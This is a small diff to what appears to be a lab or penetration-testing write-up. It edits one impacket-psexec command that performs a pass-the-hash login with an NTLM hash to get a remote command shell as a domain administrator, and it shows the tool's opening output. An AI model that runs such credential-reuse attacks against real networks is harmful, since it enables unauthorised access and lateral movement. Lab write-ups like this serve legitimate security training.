@@ -411,7 +411,7 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 
 ```console
 ┌──(root㉿kali)-[~]
-└─# impacket-psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 domainadmin@192.168.17.12 cmd
+└─# impacket-psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.12 cmd
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Requesting shares on 192.168.17.12.....
